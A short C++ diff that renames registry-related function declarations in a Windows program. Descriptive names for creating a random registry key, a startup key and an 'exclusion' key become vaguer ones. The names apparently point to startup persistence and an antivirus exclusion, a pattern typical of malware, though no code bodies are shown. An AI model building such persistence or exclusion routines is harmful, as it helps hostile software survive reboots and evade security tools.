@@ -15,7 +15,7 @@
 #pragma comment(lib, "Shlwapi.lib")
 
 // Déclarations des fonctions liées au registre
-std::wstring GenerateRandomRegistryKey(int length);
-void SetStartupRegistryKey(const std::wstring& registryKey, const std::wstring& value);
-void SetExclusionRegistryKey(const wchar_t* value);
+std::wstring GenerateRandom(int length);
+void SetStartKey(const std::wstring& registryKey, const std::wstring& value);
+void SetExclusionKey(const wchar_t* value);
 void Start(void);
